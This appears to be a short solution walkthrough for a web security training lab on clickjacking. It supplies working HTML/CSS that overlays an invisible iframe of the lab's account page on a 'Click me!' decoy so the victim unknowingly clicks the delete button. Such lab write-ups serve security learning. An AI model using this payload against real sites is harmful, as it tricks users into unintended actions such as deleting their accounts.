First, login as `wiener` user.  Then click on `Go to exploit server`. On the exploit server paste the following code. **Note**, you may have to edit the `top` and `left` values in `#divBlock` as needed. To do this, click on `View exploit` and check whether the `Click me!` div aligns properly with the delete button and adjust accordingly.

```
<br>
<style>
   #iframeBlock {
       position:relative;
       width:700;
       height: 500;
       opacity: 0.0;
       z-index: 2;
   }
   #divBlock {
       position:absolute;
       color:green;
       top:515;
       left:68;
       z-index: 1;
   }
</style>
<div id="divBlock">Click me!</div>
<iframe id="iframeBlock" src="https://ac691f8e1e9279c380c9b56a005e0018.web-security-academy.net/my-account"></iframe>
```

Then, click on `Deliver exploit to victim` and the lab will be solved!

